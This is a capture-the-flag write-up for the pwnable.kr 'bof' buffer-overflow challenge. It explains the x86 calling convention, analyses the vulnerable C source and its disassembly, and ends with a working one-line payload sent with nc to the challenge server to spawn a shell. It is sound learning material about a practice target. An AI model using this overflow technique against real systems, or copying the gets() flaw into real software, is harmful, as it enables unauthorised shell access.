### bof (a.k.a buffer overflow)

#####  Solved based on write-ups from [nrjflow](https://www.nrjfl0w.org/index.php/2016/08/09/pwnable-kr-bof-writeup-toddlers-bottle/) and [USCGA github page](https://github.com/USCGA/writeups/tree/master/pwnable.kr/bof)

This was a good time to get a refresher on how the calling convention works on `x86` architectures:

- parameters of the functions are pushed to the stack, from last to first
- `ebp` is pushed to the stack
- return address is pushed to the stack
- value of `ebp` is updated to be the value of `esp`
- subtract a value from `esp` to make space for local stack frame
- push the values of local variables to current stack frame

The following picture sums this up nicely (_note that parameter will have a positive index from `ebp` while local variable have negative indices_):

![x86 calling convention](https://www.nrjfl0w.org/wp-content/uploads/2016/08/Screen-Shot-2016-08-09-at-10.21.43-PM.png)

Now as to the specific challenge, let's begin by looking at the `C` code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

The basic idea is that `func` is called with argument `0xdeadbeef` but this value is later compared with `0xcafebabe` to give us the shell access. The hint is that we overflow the `overflowme` variable, which is a local variable and hence at a negative offset from `ebp`, to overwrite the value of `key`, which is a parameter passed to `func` and hence at a positive offset from `ebp`. Here, lets have a look at the assembly code for `func`:

```assembly
$ objdump -d bof | grep -A10 func
0000062c <func>:
 62c:	55                   	push   %ebp
 62d:	89 e5                	mov    %esp,%ebp
 62f:	83 ec 48             	sub    $0x48,%esp
 632:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 638:	89 45 f4             	mov    %eax,-0xc(%ebp)
 63b:	31 c0                	xor    %eax,%eax
 63d:	c7 04 24 8c 07 00 00 	movl   $0x78c,(%esp)
 644:	e8 fc ff ff ff       	call   645 <func+0x19>
 649:	8d 45 d4             	lea    -0x2c(%ebp),%eax
 64c:	89 04 24             	mov    %eax,(%esp)
 64f:	e8 fc ff ff ff       	call   650 <func+0x24>
 654:	81 7d 08 be ba fe ca 	cmpl   $0xcafebabe,0x8(%ebp)
 65b:	75 0e                	jne    66b <func+0x3f>
 65d:	c7 04 24 9b 07 00 00 	movl   $0x79b,(%esp)
 664:	e8 fc ff ff ff       	call   665 <func+0x39>
 669:	eb 0c                	jmp    677 <func+0x4b>
 66b:	c7 04 24 a3 07 00 00 	movl   $0x7a3,(%esp)
 672:	e8 fc ff ff ff       	call   673 <func+0x47>
 677:	8b 45 f4             	mov    -0xc(%ebp),%eax
 67a:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 681:	74 05                	je     688 <func+0x5c>
 683:	e8 fc ff ff ff       	call   684 <func+0x58>
 688:	c9                   	leave  
 689:	c3                   	ret
```

We know that `0xdeadbeef` would be at `$ebp+8`. Note that at line 649, `2c` is subtracted from `ebp`, pushed to the stack and `gets` called. This implies that gets puts the input value at `ebp-0x2c`. The difference is 52 bytes. Now to overflow the program the right amount:

```sh
$ # python => python3
$ (python -c "import sys; sys.stdout.buffer.write(b'\x90' * 52 + b'\xbe\xba\xfe\xca\n')"; cat) | nc pwnable.kr 9000
```

